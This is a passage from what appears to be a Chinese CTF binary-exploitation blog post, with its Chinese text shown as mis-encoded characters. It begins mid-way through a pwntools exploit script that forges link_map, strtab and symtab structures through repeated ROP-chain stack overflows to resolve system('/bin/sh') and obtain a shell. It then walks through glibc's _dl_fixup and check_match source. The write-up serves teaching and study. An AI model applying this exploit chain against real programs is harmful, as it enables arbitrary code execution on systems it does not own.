class="number">0.5</span>)</span><br><span class="line">r.sendline(flat(<span class="number">0x601028</span>, gadget_for_read, <span class="number">0x600EC0</span> + <span class="number">0x8</span>))</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>, gadget_csu, <span class="number">0</span>, <span class="number">1</span>, bss + <span class="number">8</span>,</span><br><span class="line">               <span class="number">501</span>, <span class="number">1</span>, <span class="number">0x10</span>, <span class="number">0x4007C0</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>*<span class="number">7</span>, main_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bss = bss - <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿™é‡Œåˆä¸€æ¬¡è¯»å–äº†ä¸€ä¸‹DT_DEBUG + 8çš„å†…å®¹</span></span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>, pop_rdi, <span class="number">0</span>, pop_rsi_r15, bss, <span class="number">0</span>, read_plt, main_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">r.sendline(flat(<span class="number">0x600EC0</span> + <span class="number">0x8</span>, gadget_for_read, <span class="number">0x600EC0</span> + <span class="number">0x8</span>))</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>, gadget_csu, <span class="number">0</span>, <span class="number">1</span>, bss + <span class="number">8</span>,</span><br><span class="line">               <span class="number">3</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0x4007C0</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>*<span class="number">7</span>, main_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">bss = bss+<span class="number">0x10</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿™é‡Œæ˜¯å‘0x601020ä½ç½®å†™å…¥link_mapåœ°å€</span></span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>, pop_rdi, <span class="number">0</span>, pop_rsi_r15, bss, <span class="number">0</span>, read_plt, main_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">r.sendline(flat(<span class="number">0x601028</span>, gadget_for_read, <span class="number">0x600EC0</span> + <span class="number">0x8</span>))</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>, gadget_csu, <span class="number">0</span>, <span class="number">1</span>, bss + <span class="number">8</span>,</span><br><span class="line">               <span class="number">0</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">0x4007C0</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>*<span class="number">7</span>, main_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿™ä¸€æ­¥æ˜¯ä¿®æ”¹link_mapçš„dynrelæŒ‡é’ˆæŒ‡å‘bssæ®µ</span></span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>, pop_rdi, <span class="number">0</span>, pop_rsi_r15, bss, <span class="number">0</span>, read_plt, main_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">r.sendline(flat(<span class="number">0x601028</span>, gadget_for_write, <span class="number">0x600EC0</span> + <span class="number">0x8</span>))</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>, gadget_csu, <span class="number">0</span>, <span class="number">1</span>, bss + <span class="number">8</span>,</span><br><span class="line">               bss+<span class="number">0x300</span>, <span class="number">0x1f</span>, -<span class="number">1</span>, <span class="number">0x4007C0</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>*<span class="number">7</span>, main_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># åœ¨bssæ®µçš„å¯¹åº”ä½ç½®å†™ä¸Šfake_dynrel</span></span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>, pop_rdi, <span class="number">0</span>, pop_rsi_r15,</span><br><span class="line">               bss+<span class="number">0x300</span>, <span class="number">0</span>, read_plt, main_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">r.sendline(flat(<span class="number">0</span>, bss+<span class="number">0x310</span>).ljust(<span class="number">0x20</span>,</span><br><span class="line">           <span class="string">b&#x27;\x00&#x27;</span>)+<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># åœ¨fake_dynrelç»“æ„ä½“çš„åç§»ä¸º0x8çš„ä½ç½®åªæƒ³çš„æ˜¯fake_relçš„åœ°å€ï¼Œæ‰€ä»¥è¿˜éœ€è¦åœ¨è¿™é‡Œä¼ªé€ </span></span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>, pop_rdi, <span class="number">0</span>, pop_rsi_r15,</span><br><span class="line">               bss+<span class="number">0x310</span>, <span class="number">0</span>, read_plt, main_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">r.sendline(flat(bss+<span class="number">0x700</span>, <span class="number">7</span>, <span class="number">0</span>))</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># å†™å…¥fake strtabå’Œ/bin/sh</span></span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>, pop_rdi, <span class="number">0</span>, pop_rsi_r15,</span><br><span class="line">               bss+<span class="number">0x30</span>, <span class="number">0</span>, read_plt, main_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">r.sendline(flat(<span class="number">0</span>, bss+<span class="number">0x40</span>, <span class="string">b&quot;system\x00&quot;</span>).ljust(<span class="number">0x50</span>,</span><br><span class="line">           <span class="string">b&#x27;\x00&#x27;</span>)+<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¦†ç›–link_mapä¸­strtabæŒ‡é’ˆçš„åœ°å€</span></span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>, gadget_csu, <span class="number">0</span>, <span class="number">1</span>, bss + <span class="number">8</span>,</span><br><span class="line">               bss+<span class="number">0x30</span>, <span class="number">0xd</span>, -<span class="number">1</span>, <span class="number">0x4007C0</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>*<span class="number">7</span>, main_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># å†™å…¥fake_symtab</span></span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>, pop_rdi, <span class="number">0</span>, pop_rsi_r15,</span><br><span class="line">               bss+<span class="number">0x100</span>, <span class="number">0</span>, read_plt, main_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">r.sendline(flat(<span class="number">0</span>, elf.got[<span class="string">&#x27;read&#x27;</span>]-<span class="number">8</span>).ljust(<span class="number">0x50</span>, <span class="string">b&#x27;\x00&#x27;</span>)+<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¦†ç›–link_mapä¸­çš„symtabæŒ‡é’ˆçš„å€¼</span></span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>, gadget_csu, <span class="number">0</span>, <span class="number">1</span>, bss + <span class="number">8</span>,</span><br><span class="line">               bss+<span class="number">0x100</span>, <span class="number">0xe</span>, -<span class="number">1</span>, <span class="number">0x4007C0</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>*<span class="number">7</span>, main_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">bss = bss - <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è¯»å–link_mapåœ°å€åˆ°0x601040ä½ç½®</span></span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>, pop_rdi, <span class="number">0</span>, pop_rsi_r15, bss, <span class="number">0</span>, read_plt, main_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">r.sendline(flat(<span class="number">0x600EC0</span> + <span class="number">0x8</span>, gadget_for_read, <span class="number">0x600EC0</span> + <span class="number">0x8</span>))</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>, gadget_csu, <span class="number">0</span>, <span class="number">1</span>, bss + <span class="number">8</span>,</span><br><span class="line">               <span class="number">3</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0x4007C0</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>*<span class="number">7</span>, main_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">bss = bss+<span class="number">0x10</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å†™å…¥link_mapåœ°å€ï¼Œå®ç°æ ˆä¸º_dl_runtime_resolve(&lt;-rsp)=&gt;link_map=&gt;0 å¹¶ä¸”æ­¤æ—¶ripä¸ºret</span></span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>, pop_rdi, <span class="number">0</span>, pop_rsi_r15, bss, <span class="number">0</span>, read_plt, main_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">r.sendline(flat(<span class="number">0x601028</span>, gadget_for_read, <span class="number">0x600EC0</span> + <span class="number">0x8</span>))</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>, gadget_csu, <span class="number">0</span>, <span class="number">1</span>, bss + <span class="number">8</span>,</span><br><span class="line">               <span class="number">503</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">0x4007C0</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>*<span class="number">7</span>, main_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># é€šè¿‡æ ˆè¿ç§»ï¼Œé¡ºåˆ©æ‰§è¡Œdl-runtime-resolve</span></span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>, <span class="number">0x601fc8</span>, pop_rdi, bss+<span class="number">0x100</span>+<span class="number">0x50</span>, <span class="number">0x400772</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(r, <span class="string">&#x27;directory ./glibc-2.35/elf&#x27;</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="é‡ç‚¹ï¼šä¸Partialåˆ©ç”¨æ–¹å¼çš„åŒºåˆ«"><a href="#é‡ç‚¹ï¼šä¸Partialåˆ©ç”¨æ–¹å¼çš„åŒºåˆ«" class="headerlink" title="é‡ç‚¹ï¼šä¸Partialåˆ©ç”¨æ–¹å¼çš„åŒºåˆ«"></a>é‡ç‚¹ï¼šä¸Partialåˆ©ç”¨æ–¹å¼çš„åŒºåˆ«</h2><h3 id="Partialåˆ©ç”¨æ–¹å¼é‡è°ˆ"><a href="#Partialåˆ©ç”¨æ–¹å¼é‡è°ˆ" class="headerlink" title="Partialåˆ©ç”¨æ–¹å¼é‡è°ˆ"></a>Partialåˆ©ç”¨æ–¹å¼é‡è°ˆ</h3><p><strong>( åœ¨ä¸‹é¢è®¨è®ºè€ç‰ˆæœ¬æ—¶ï¼Œé»˜è®¤åªå­˜åœ¨æ ˆæº¢å‡ºï¼Œä¸å­˜åœ¨ä¸Šè¿°é¢˜ç›®ä¸­çš„gadget )</strong></p><p>åœ¨ä»¥å‰çš„æ–‡ç« ï¼Œåœ¨64ä½çš„partialä¿æŠ¤ä¸­æˆ‘å†™çš„éå¸¸ç²—ç³™ï¼Œæ‰€ä»¥åœ¨è¿™é‡Œä¹Ÿè¶æ­¤æœºä¼šè¯¦ç»†è°ˆä¸€ä¸‹ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">DL_FIXUP_VALUE_TYPE</span><br><span class="line">attribute_hidden __attribute ((noinline)) DL_ARCH_FIXUP_ATTRIBUTE</span><br><span class="line">_dl_fixup (</span><br><span class="line"><span class="meta"># <span class="meta-keyword">ifdef</span> ELF_MACHINE_RUNTIME_FIXUP_ARGS</span></span><br><span class="line">   ELF_MACHINE_RUNTIME_FIXUP_ARGS,</span><br><span class="line"><span class="meta"># <span class="meta-keyword">endif</span></span></span><br><span class="line">   struct link_map *l, ElfW(Word) reloc_arg)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *<span class="keyword">const</span> symtab</span></span><br><span class="line"><span class="function">    </span>= (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[DT_SYMTAB]);</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *strtab = (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[DT_STRTAB]);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">uintptr_t</span> pltgot = (<span class="keyword">uintptr_t</span>) D_PTR (l, l_info[DT_PLTGOT]);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> PLTREL *<span class="keyword">const</span> reloc</span><br><span class="line">    = (<span class="keyword">const</span> <span class="keyword">void</span> *) (D_PTR (l, l_info[DT_JMPREL])</span><br><span class="line">      + reloc_offset (pltgot, reloc_arg));</span><br><span class="line">  <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *sym </span>= &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];</span><br><span class="line">  <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *refsym </span>= sym;</span><br><span class="line">  <span class="keyword">void</span> *<span class="keyword">const</span> rel_addr = (<span class="keyword">void</span> *)(l-&gt;l_addr + reloc-&gt;r_offset);</span><br><span class="line">  <span class="keyword">lookup_t</span> result;</span><br><span class="line">  DL_FIXUP_VALUE_TYPE value;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Sanity check that we&#x27;re really looking at a PLT relocation.  */</span></span><br><span class="line">  assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);</span><br><span class="line"></span><br><span class="line">   <span class="comment">/* Look up the target symbol.  If the normal lookup rules are not</span></span><br><span class="line"><span class="comment">      used don&#x27;t look in the global scope.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), <span class="number">0</span>) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">r_found_version</span> *<span class="title">version</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Half)</span> *vernum </span>=</span><br><span class="line">    (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);</span><br><span class="line">  ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; <span class="number">0x7fff</span>;</span><br><span class="line">  version = &amp;l-&gt;l_versions[ndx];</span><br><span class="line">  <span class="keyword">if</span> (version-&gt;hash == <span class="number">0</span>)</span><br><span class="line">    version = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* We need to keep the scope around so do some locking.  This is</span></span><br><span class="line"><span class="comment"> not necessary for objects which cannot be unloaded or when</span></span><br><span class="line"><span class="comment"> we are not using any threads (yet).  */</span></span><br><span class="line">      <span class="keyword">int</span> flags = DL_LOOKUP_ADD_DEPENDENCY;</span><br><span class="line">      <span class="keyword">if</span> (!RTLD_SINGLE_THREAD_P)</span><br><span class="line">&#123;</span><br><span class="line">  THREAD_GSCOPE_SET_FLAG ();</span><br><span class="line">  flags |= DL_LOOKUP_GSCOPE_LOCK;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> RTLD_ENABLE_FOREIGN_CALL</span></span><br><span class="line">      RTLD_ENABLE_FOREIGN_CALL;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">      result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,</span><br><span class="line">    version, ELF_RTYPE_CLASS_PLT, flags, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* We are done with the global scope.  */</span></span><br><span class="line">      <span class="keyword">if</span> (!RTLD_SINGLE_THREAD_P)</span><br><span class="line">THREAD_GSCOPE_RESET_FLAG ();</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> RTLD_FINALIZE_FOREIGN_CALL</span></span><br><span class="line">      RTLD_FINALIZE_FOREIGN_CALL;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Currently result contains the base load address (or link map)</span></span><br><span class="line"><span class="comment"> of the object that defines sym.  Now add in the symbol</span></span><br><span class="line"><span class="comment"> offset.  */</span></span><br><span class="line">      value = DL_FIXUP_MAKE_VALUE (result,</span><br><span class="line">   SYMBOL_ADDRESS (result, sym, <span class="literal">false</span>));</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* We already found the symbol.  The module (and therefore its load</span></span><br><span class="line"><span class="comment"> address) is also known.  */</span></span><br><span class="line">      value = DL_FIXUP_MAKE_VALUE (l, SYMBOL_ADDRESS (l, sym, <span class="literal">true</span>));</span><br><span class="line">      result = l;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  ... ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆåˆ™æ˜¯å…³äº<code>_dl_fixup</code>å‡½æ•°çš„é‡æ–°åˆ†æï¼Œé€šè¿‡å­—ç¬¦ä¸²è¿›è¡ŒæŸ¥æ‰¾å¯¹åº”å‡½æ•°æ—¶æˆ‘ä»¬éœ€è¦è¿›å…¥åˆ°åº•è¿™æ¡ifè¯­å¥</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), <span class="number">0</span>) == <span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>è€Œæœ€ç»ˆçœŸæ­£æ‰¾åˆ°å‡½æ•°åœ°å€çš„å‡½æ•°å…¶å®æ˜¯<code>_dl_lookup_symbol_x</code>å‡½æ•°ã€‚ç„¶è€Œå…¶ä¸­å­˜åœ¨ä¸€æ¡è°ƒç”¨å…³ç³»æ˜¯<code>do_lookup_x</code>=&gt;<code>check_match</code>ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *</span></span><br><span class="line"><span class="function"><span class="title">check_match</span> <span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *<span class="keyword">const</span> undef_name,</span></span></span><br><span class="line"><span class="params"><span class="function">     <span class="keyword">const</span> ElfW(Sym) *<span class="keyword">const</span> ref,</span></span></span><br><span class="line"><span class="params"><span class="function">     <span class="keyword">const</span> struct r_found_version *<span class="keyword">const</span> version,</span></span></span><br><span class="line"><span class="params"><span class="function">     <span class="keyword">const</span> <span class="keyword">int</span> flags,</span></span></span><br><span class="line"><span class="params"><span class="function">     <span class="keyword">const</span> <span class="keyword">int</span> type_class,</span></span></span><br><span class="line"><span class="params"><span class="function">     <span class="keyword">const</span> ElfW(Sym) *<span class="keyword">const</span> sym,</span></span></span><br><span class="line"><span class="params"><span class="function">     <span class="keyword">const</span> Elf_Symndx symidx,</span></span></span><br><span class="line"><span class="params"><span class="function">     <span class="keyword">const</span> <span class="keyword">char</span> *<span class="keyword">const</span> strtab,</span></span></span><br><span class="line"><span class="params"><span class="function">     <span class="keyword">const</span> struct link_map *<span class="keyword">const</span> <span class="built_in">map</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">     <span class="keyword">const</span> ElfW(Sym) **<span class="keyword">const</span> versioned_sym,</span></span></span><br><span class="line"><span class="params"><span class="function">     <span class="keyword">int</span> *<span class="keyword">const</span> num_versions)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> stt = ELFW(ST_TYPE) (sym-&gt;st_info);</span><br><span class="line">  assert (ELF_RTYPE_CLASS_PLT == <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely ((sym-&gt;st_value == <span class="number">0</span> <span class="comment">/* No value.  */</span></span><br><span class="line"> &amp;&amp; sym-&gt;st_shndx != SHN_ABS</span><br><span class="line"> &amp;&amp; stt != STT_TLS)</span><br><span class="line">|| elf_machine_sym_no_match (sym)</span><br><span class="line">|| (type_class &amp; (sym-&gt;st_shndx == SHN_UNDEF))))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Ignore all but STT_NOTYPE, STT_OBJECT, STT_FUNC,</span></span><br><span class="line"><span class="comment">     STT_COMMON, STT_TLS, and STT_GNU_IFUNC since these are no</span></span><br><span class="line"><span class="comment">     code/data definitions.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ALLOWED_STT \</span></span><br><span class="line"><span class="meta">  ((1 &lt;&lt; STT_NOTYPE) | (1 &lt;&lt; STT_OBJECT) | (1 &lt;&lt; STT_FUNC) \</span></span><br><span class="line"><span class="meta">   | (1 &lt;&lt; STT_COMMON) | (1 &lt;&lt; STT_TLS) | (1 &lt;&lt; STT_GNU_IFUNC))</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (((<span class="number">1</span> &lt;&lt; stt) &amp; ALLOWED_STT) == <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (sym != ref &amp;&amp; <span class="built_in">strcmp</span> (strtab + sym-&gt;st_name, undef_name))</span><br><span class="line">    <span class="comment">/* Not the symbol we are looking for.  */</span></span><br><span 